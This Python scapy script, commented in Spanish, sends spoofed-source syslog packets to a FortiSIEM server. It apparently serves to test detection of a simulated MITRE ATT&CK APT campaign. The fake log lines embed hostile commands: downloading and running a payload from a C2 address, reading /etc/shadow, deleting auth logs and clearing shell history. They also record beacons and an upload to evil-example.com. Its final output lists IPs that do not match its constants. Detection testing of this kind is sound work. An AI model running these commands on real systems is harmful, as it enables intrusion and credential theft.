#!/usr/bin/env python3

from scapy.all import IP, UDP, Raw, send
from datetime import datetime
import random
import time

# ==========================================================
# APT MITRE ATT&CK SIMULADO PARA FORTISIEM 7.5
# Versión Scapy con Reporting IP spoofeada por fuente.
# Solo envía syslog UDP sintético.
# No ejecuta ataques reales.
# ==========================================================

FORTISIEM_IP = "10.255.9.3"
FORTISIEM_PORT = 514

# Reporting IPs simuladas
REPORTING_IP_FORTIGATE = "172.16.20.101"
REPORTING_IP_FORTIPROXY = "172.16.20.102"
REPORTING_IP_LINUX = "172.16.20.103"

# Hostnames simulados
FGT_HOST = "FGT-PROD-EDGE"
FPX_HOST = "FPX-PROD-PROXY"
LINUX_HOST = "linux-PROD-web01"

# Entidades APT
ATTACKER_IP = "18.231.88.45"
C2_IP = "4.83.120.10"
DNS_IP = "8.8.8.8"

LINUX_TARGET = "192.168.1.20"
WINDOWS_TARGET = "192.168.1.30"
INTERNAL_ATTACKER = "191.168.2.20"

USER = "j.garcia"


def syslog_timestamp():
    return datetime.now().strftime("%b %d %H:%M:%S")


def forti_date():
    return datetime.now().strftime("%Y-%m-%d")


def forti_time():
    return datetime.now().strftime("%H:%M:%S")


def epoch_ns():
    return f"{int(time.time())}000000000"


def send_syslog(reporting_ip: str, hostname: str, message: str, pri: str = "<189>"):
    """
    Envía un paquete Syslog UDP con IP origen falsificada.
    FortiSIEM verá reporting_ip como Reporting IP si la red permite el paquete.
    """
    payload = f"{pri}{syslog_timestamp()} {hostname} {message}"

    pkt = (
        IP(src=reporting_ip, dst=FORTISIEM_IP)
        / UDP(sport=random.randint(20000, 65000), dport=FORTISIEM_PORT)
        / Raw(load=payload.encode())
    )

    send(pkt, verbose=False)
    print(f"[+] {reporting_ip} / {hostname} -> {message[:140]}")
    time.sleep(1)


def send_fgt(message: str):
    send_syslog(REPORTING_IP_FORTIGATE, FGT_HOST, message, pri="<189>")


def send_fpx(message: str):
    send_syslog(REPORTING_IP_FORTIPROXY, FPX_HOST, message, pri="<189>")


def send_linux(message: str):
    send_syslog(REPORTING_IP_LINUX, LINUX_HOST, message, pri="<134>")


def fgt_traffic(
    srcip,
    dstip,
    srcport,
    dstport,
    action,
    service,
    proto,
    msg,
    level="notice",
    sentbyte=0,
    rcvdbyte=0,
    sessionid=None,
):
    if sessionid is None:
        sessionid = random.randint(100000, 999999)

    return (
        f'date={forti_date()} time={forti_time()} '
        f'devname="{FGT_HOST}" devid="FGVM000000000001" '
        f'eventtime={epoch_ns()} tz="+0100" '
        f'logid="0000000013" type="traffic" subtype="forward" level="{level}" vd="root" '
        f'srcip={srcip} srcport={srcport} srcintf="wan1" srcintfrole="wan" '
        f'dstip={dstip} dstport={dstport} dstintf="lan" dstintfrole="lan" '
        f'srccountry="Reserved" dstcountry="Reserved" sessionid={sessionid} '
        f'proto={proto} action="{action}" policyid=10 policytype="policy" '
        f'service="{service}" trandisp="noop" '
        f'sentbyte={sentbyte} rcvdbyte={rcvdbyte} sentpkt=10 rcvdpkt=8 '
        f'appcat="unscanned" msg="{msg}"'
    )


def fgt_dns(srcip, qname, dstip=DNS_IP):
    return (
        f'date={forti_date()} time={forti_time()} '
        f'devname="{FGT_HOST}" devid="FGVM000000000001" '
        f'eventtime={epoch_ns()} tz="+0100" '
        f'logid="1501054802" type="utm" subtype="dns" eventtype="dns-query" '
        f'level="notice" vd="root" '
        f'srcip={srcip} srcport={random.randint(20000, 65000)} '
        f'dstip={dstip} dstport=53 proto=17 action="pass" '
        f'qname="{qname}" qtype="A" qtypeval=1 qclass="IN" '
        f'msg="APT-MITRE T1071 DNS query for C2 domain"'
    )


def fpx_webfilter(
    srcip,
    user,
    url,
    hostname,
    msg,
    action="passthrough",
    level="warning",
    dstport=80,
    service="HTTP",
    sentbyte=350,
    rcvdbyte=1200,
):
    return (
        f'date={forti_date()} time={forti_time()} '
        f'devname="{FPX_HOST}" devid="FPXVM0000000001" '
        f'eventtime={epoch_ns()} tz="+0100" '
        f'logid="0317013312" type="utm" subtype="webfilter" eventtype="ftgd_blk" '
        f'level="{level}" vd="root" policyid=30 '
        f'sessionid={random.randint(300000, 399999)} '
        f'user="{user}" srcip={srcip} srcport={random.randint(54000, 65000)} '
        f'dstip={C2_IP} dstport={dstport} proto=6 service="{service}" '
        f'hostname="{hostname}" profile="default" action="{action}" reqtype="direct" '
        f'url="{url}" sentbyte={sentbyte} rcvdbyte={rcvdbyte} '
        f'direction="outgoing" msg="{msg}"'
    )


def linux_failed_ssh(i):
    return (
        f"sshd[{2200 + i}]: Failed password for invalid user admin "
        f"from {ATTACKER_IP} port {51000 + i} ssh2"
    )


def linux_accepted_ssh():
    return (
        f"sshd[2301]: Accepted password for {USER} "
        f"from {ATTACKER_IP} port 51122 ssh2"
    )


def linux_sudo(command):
    return (
        f"sudo: {USER} : TTY=pts/0 ; PWD=/home/{USER} ; "
        f"USER=root ; COMMAND={command}"
    )


def linux_audit_exec(seq, exe, args, key, uid="1001", euid="1001"):
    return (
        f'audit: type=EXECVE msg=audit({int(time.time())}.{random.randint(100,999)}:{seq}): '
        f'argc=3 a0="{exe}" a1="-c" a2="{args}" '
        f'auid=1001 uid={uid} gid=1001 euid={euid} tty=pts0 ses=1 '
        f'comm="{exe.split("/")[-1]}" exe="{exe}" key="{key}" user="{USER}"'
    )


def run_campaign():
    print("[+] Iniciando campaña APT-MITRE con Scapy hacia FortiSIEM")
    print("[+] Reporting IPs simuladas:")
    print(f"    FortiGate  -> {REPORTING_IP_FORTIGATE}")
    print(f"    FortiProxy -> {REPORTING_IP_FORTIPROXY}")
    print(f"    Linux      -> {REPORTING_IP_LINUX}")
    print()

    # 1. Reconnaissance - T1595
    send_fgt(
        fgt_traffic(
            srcip=ATTACKER_IP,
            dstip=LINUX_TARGET,
            srcport=50101,
            dstport=22,
            action="deny",
            service="SSH",
            proto=6,
            msg="APT-MITRE T1595 External SSH scan denied",
            sessionid=100001,
        )
    )

    send_fgt(
        fgt_traffic(
            srcip=ATTACKER_IP,
            dstip=WINDOWS_TARGET,
            srcport=50102,
            dstport=445,
            action="deny",
            service="SMB",
            proto=6,
            msg="APT-MITRE T1595 External SMB probe denied",
            sessionid=100002,
        )
    )

    send_fgt(
        fgt_traffic(
            srcip=ATTACKER_IP,
            dstip=WINDOWS_TARGET,
            srcport=50103,
            dstport=3389,
            action="deny",
            service="RDP",
            proto=6,
            msg="APT-MITRE T1595 External RDP scan denied",
            sessionid=100003,
        )
    )

    # 2. Initial Access - T1110 Brute Force
    for i in range(1, 13):
        send_linux(linux_failed_ssh(i))

    send_linux(linux_accepted_ssh())

    # 3. Privilege Escalation - T1548
    send_linux(linux_sudo("/bin/bash"))
    send_linux(linux_sudo("/usr/bin/id"))

    # 4. Execution - T1059
    send_linux(
        linux_audit_exec(
            5001,
            "/bin/bash",
            f"curl http://{C2_IP}/payload.sh -o /tmp/.sysupdate",
            "exec",
        )
    )

    send_linux(
        linux_audit_exec(
            5002,
            "/bin/chmod",
            "chmod +x /tmp/.sysupdate",
            "exec",
        )
    )

    send_linux(
        linux_audit_exec(
            5003,
            "/tmp/.sysupdate",
            "/tmp/.sysupdate --silent",
            "exec",
        )
    )

    # 5. Persistence - T1053 / T1543
    send_linux("CRON[2401]: (root) CMD (/tmp/.sysupdate --beacon)")
    send_linux(
        "systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/sysupdate.service "
        "→ /etc/systemd/system/sysupdate.service."
    )
    send_linux("systemd[1]: Started sysupdate.service.")

    # 6. Defense Evasion - T1070
    send_linux(
        linux_audit_exec(
            5004,
            "/usr/bin/history",
            "history -c",
            "defense_evasion",
        )
    )

    send_linux(linux_sudo("/usr/bin/rm -f /var/log/auth.log"))

    send_linux(
        f'audit: type=PATH msg=audit({int(time.time())}.127:5005): '
        f'item=0 name="/var/log/auth.log" inode=12345 dev=08:01 '
        f'mode=0100640 ouid=0 ogid=4 rdev=00:00 nametype=DELETE '
        f'msg="APT-MITRE T1070 Simulated log deletion"'
    )

    # 7. Credential Access - T1003, sintético
    send_linux(
        linux_audit_exec(
            5006,
            "/bin/cat",
            "/etc/shadow",
            "cred_access",
            uid="0",
            euid="0",
        )
    )

    send_linux(
        linux_audit_exec(
            5007,
            "/usr/bin/strings",
            "/etc/security/opasswd",
            "cred_access",
            uid="0",
            euid="0",
        )
    )

    # 8. Discovery - T1087 / T1046
    send_linux(linux_audit_exec(5008, "/usr/bin/whoami", "whoami", "discovery"))
    send_linux(linux_audit_exec(5009, "/usr/bin/id", "id", "discovery"))
    send_linux(linux_audit_exec(5010, "/usr/sbin/ip", "ip addr", "discovery"))
    send_linux(linux_audit_exec(5011, "/usr/bin/nmap", "nmap -sS 10.0.10.0/24", "discovery"))

    # 9. Lateral Movement - T1021.002 / T1021.001
    send_fgt(
        fgt_traffic(
            srcip=INTERNAL_ATTACKER,
            dstip=WINDOWS_TARGET,
            srcport=53321,
            dstport=445,
            action="accept",
            service="SMB",
            proto=6,
            msg="APT-MITRE T1021.002 Internal SMB lateral movement",
            sentbyte=20480,
            rcvdbyte=10240,
            sessionid=200001,
        )
    )

    send_fgt(
        fgt_traffic(
            srcip=INTERNAL_ATTACKER,
            dstip=WINDOWS_TARGET,
            srcport=53322,
            dstport=3389,
            action="accept",
            service="RDP",
            proto=6,
            msg="APT-MITRE T1021.001 Internal RDP lateral movement",
            sentbyte=30000,
            rcvdbyte=22000,
            sessionid=200002,
        )
    )

    # 10. Collection - T1005
    send_linux(
        linux_audit_exec(
            5012,
            "/bin/tar",
            "tar -czf /tmp/finance_backup.tar.gz /srv/finance",
            "collection",
        )
    )

    send_linux(
        linux_audit_exec(
            5013,
            "/usr/bin/find",
            "find /home -name *.xlsx",
            "collection",
        )
    )

    # 11. Command and Control - T1071.001
    for i in range(1, 9):
        send_fpx(
            fpx_webfilter(
                srcip=WINDOWS_TARGET,
                user=USER,
                url=f"http://update-checkin-cdn.evil-example.com/checkin?id={i}",
                hostname="update-checkin-cdn.evil-example.com",
                msg="APT-MITRE T1071.001 Periodic C2 beacon",
                action="passthrough",
                level="warning",
                dstport=80,
                service="HTTP",
                sentbyte=350,
                rcvdbyte=1200,
            )
        )

    send_fgt(fgt_dns(WINDOWS_TARGET, "update-checkin-cdn.evil-example.com"))
    send_fgt(fgt_dns(WINDOWS_TARGET, "d3f9a1b2c7.evil-example.com"))

    # 12. Exfiltration - T1041
    send_fpx(
        fpx_webfilter(
            srcip=WINDOWS_TARGET,
            user=USER,
            url="https://evil-example.com/upload",
            hostname="evil-example.com",
            msg="APT-MITRE T1041 Large outbound upload over HTTPS",
            action="passthrough",
            level="alert",
            dstport=443,
            service="HTTPS",
            sentbyte=52428800,
            rcvdbyte=1024,
        )
    )

    send_fgt(
        fgt_traffic(
            srcip=WINDOWS_TARGET,
            dstip=C2_IP,
            srcport=54443,
            dstport=443,
            action="accept",
            service="HTTPS",
            proto=6,
            msg="APT-MITRE T1041 Possible data exfiltration to external C2",
            level="warning",
            sentbyte=52428800,
            rcvdbyte=1024,
            sessionid=400002,
        )
    )

    # 13. Impact - T1486, sintético
    send_linux(
        linux_audit_exec(
            5014,
            "/usr/bin/openssl",
            "openssl enc -aes-256-cbc",
            "impact"
        )
    )

    send_linux(
        f"kernel: audit: ransomware-like file activity detected "
        f"path=/srv/finance filename=finance_backup.xlsx.encrypted user={USER} "
        f"srcip={INTERNAL_ATTACKER} msg=\"APT-MITRE T1486 Simulated impact event\""
    )

    print()
    print("[+] Simulación APT-MITRE finalizada.")
    print("[+] Busca en FortiSIEM: APT-MITRE, 185.231.88.45, 45.83.120.10, j.garcia")
    print("[+] Comprueba Reporting IP:")
    print(f"    {REPORTING_IP_FORTIGATE} = FortiGate")
    print(f"    {REPORTING_IP_FORTIPROXY} = FortiProxy")
    print(f"    {REPORTING_IP_LINUX} = Linux")
    print(f"    {FORTISIEM_IP} = Linux")


if __name__ == "__main__":
    run_campaign()
